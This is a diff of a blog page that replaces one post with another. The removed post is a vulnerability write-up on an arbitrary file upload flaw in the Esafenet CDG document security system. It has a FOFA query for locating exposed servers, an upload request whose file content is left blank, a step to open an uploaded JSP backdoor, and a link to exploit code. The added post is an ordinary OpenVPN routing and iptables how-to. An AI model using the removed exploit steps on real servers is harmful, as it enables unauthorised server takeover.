@@ -16,21 +16,21 @@
   <meta name="author" content="candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、产品简介亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结">
+    <meta name="description" content="要让一个 OpenVPN 客户端（client1）通过另一个客户端（client2）的网络流量访问特定域名（如 xxx 域名），你可以采取以下步骤：  在 client2 上设置路由：确保 client2 的 OpenVPN 配置中允许其他客户端通过它进行路由。你需要在 server.conf 中添加以下行： 1client-to-client  这将允许客户端之间的直接通信。  在 client">
 <meta property="og:type" content="article">
-<meta property="og:title" content="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用">
-<meta property="og:url" content="https://candyadmin.github.io/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="openvpn中使用client1访问xxx域名时，走client2的网络流量来访问">
+<meta property="og:url" content="https://candyadmin.github.io/2024/10/10/openvpn%E4%B8%AD%E4%BD%BF%E7%94%A8client1%E8%AE%BF%E9%97%AExxx%E5%9F%9F%E5%90%8D%E6%97%B6%EF%BC%8C%E8%B5%B0client2%E7%9A%84%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E6%9D%A5%E8%AE%BF%E9%97%AE/index.html">
 <meta property="og:site_name" content="点到为止">
-<meta property="og:description" content="一、产品简介亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结">
+<meta property="og:description" content="要让一个 OpenVPN 客户端（client1）通过另一个客户端（client2）的网络流量访问特定域名（如 xxx 域名），你可以采取以下步骤：  在 client2 上设置路由：确保 client2 的 OpenVPN 配置中允许其他客户端通过它进行路由。你需要在 server.conf 中添加以下行： 1client-to-client  这将允许客户端之间的直接通信。  在 client">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-09-29T09:50:52.000Z">
-<meta property="article:modified_time" content="2024-09-29T09:58:27.065Z">
+<meta property="article:published_time" content="2024-10-10T03:40:10.000Z">
+<meta property="article:modified_time" content="2024-10-10T03:40:23.017Z">
 <meta property="article:author" content="candy">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用 - 点到为止</title>
+  <title>openvpn中使用client1访问xxx域名时，走client2的网络流量来访问 - 点到为止</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用"></span>
+            <span id="subtitle" data-typed-text="openvpn中使用client1访问xxx域名时，走client2的网络流量来访问"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-29 17:50" pubdate>
-          2024年9月29日 下午
+        <time datetime="2024-10-10 11:40" pubdate>
+          2024年10月10日 中午
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          450 字
+          396 字
         
       </span>
     
@@ -267,15 +267,41 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</h1>
+            <h1 id="seo-header">openvpn中使用client1访问xxx域名时，走client2的网络流量来访问</h1>
             
             
               <div class="markdown-body">
                 
-                <p>一、产品简介<br>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br>二、漏洞描述<br>亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。<br>三、影响范围<br>未知<br>四、复现环境<br>FOFA：app&#x3D;“亿赛通-电子文档安全管理系统”<br>五、漏洞复现<br>1.访问存在漏洞网站，抓包<br>2.POC</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angular2html">POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1<br>Host: IP：port<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: none<br>Sec-Fetch-User: ?1<br>Upgrade-Insecure-Requests: 1<br><br><br>上传的文件内容<br></code></pre></td></tr></table></figure>
-<p>3.测试，上传成功<br>4.访问ip:port&#x2F;tttT.jsp</p>
-<p>利用源码：<a target="_blank" rel="noopener" href="https://github.com/candyadmin/CDGXStreamDeserRCE">https://github.com/candyadmin/CDGXStreamDeserRCE</a><br>教程：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra">https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136690493">https://blog.csdn.net/uuzeray/article/details/136690493</a></p>
+                <p>要让一个 OpenVPN 客户端（client1）通过另一个客户端（client2）的网络流量访问特定域名（如 xxx 域名），你可以采取以下步骤：</p>
+<ol>
+<li><p><strong>在 client2 上设置路由</strong>：<br>确保 client2 的 OpenVPN 配置中允许其他客户端通过它进行路由。你需要在 server.conf 中添加以下行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">client-to-client<br></code></pre></td></tr></table></figure>
+
+<p>这将允许客户端之间的直接通信。</p>
+</li>
+<li><p><strong>在 client1 上设置路由</strong>：<br>在 client1 的 OpenVPN 配置文件中，你需要添加一条静态路由，让它的流量通过 client2。你可以通过以下方式实现：</p>
+<ul>
+<li><p>在 client1 的配置文件中添加如下内容（假设 client2 的 IP 是 10.8.0.2）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">route xxx 255.255.255.255 net_gateway<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>如果 client2 的 IP 不是 10.8.0.2，请用实际的 IP 替换。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>使用 iptables 或其他工具进行流量转发</strong>：<br>在 client2 上，你可能需要设置 iptables 规则，以便将来自 client1 的流量转发到外部网络。以下是一个简单的规则示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE<br></code></pre></td></tr></table></figure>
+
+<p>确保 <code>10.8.0.0/24</code> 替换为你的 VPN 子网。</p>
+</li>
+<li><p><strong>修改 DNS 解析</strong>：<br>你可能需要在 client1 上修改 DNS 设置，确保它可以正确解析 xxx 域名。你可以在 OpenVPN 配置中添加以下行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dhcp-option DNS 8.8.8.8<br></code></pre></td></tr></table></figure>
+
+<p>替换成你想使用的 DNS 服务器。</p>
+</li>
+<li><p><strong>测试连接</strong>：<br>重启 OpenVPN 客户端，并测试 client1 是否能够通过 client2 的网络访问 xxx 域名。</p>
+</li>
+</ol>
+<p>确保在进行这些更改时备份你的配置文件，以防需要恢复。如果遇到任何问题，可以查看 OpenVPN 的日志以获取更多信息。</p>
 
                 
               </div>
@@ -293,8 +319,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</div>
-      <div>https://candyadmin.github.io/2024/09/29/亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用/</div>
+      <div>openvpn中使用client1访问xxx域名时，走client2的网络流量来访问</div>
+      <div>https://candyadmin.github.io/2024/10/10/openvpn中使用client1访问xxx域名时，走client2的网络流量来访问/</div>
     </div>
     <div class="license-meta">
       
@@ -306,7 +332,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年9月29日</div>
+          <div>2024年10月10日</div>
         </div>
       
       
@@ -338,18 +364,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/10/openvpn%E4%B8%AD%E4%BD%BF%E7%94%A8client1%E8%AE%BF%E9%97%AExxx%E5%9F%9F%E5%90%8D%E6%97%B6%EF%BC%8C%E8%B5%B0client2%E7%9A%84%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E6%9D%A5%E8%AE%BF%E9%97%AE/" title="openvpn中使用client1访问xxx域名时，走client2的网络流量来访问">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">openvpn中使用client1访问xxx域名时，走client2的网络流量来访问</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/19/spring-state-machine/" title="spring_state_machine">
-                        <span class="hidden-mobile">spring_state_machine</span>
+                      <a href="/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/" title="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用">
+                        <span class="hidden-mobile">亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
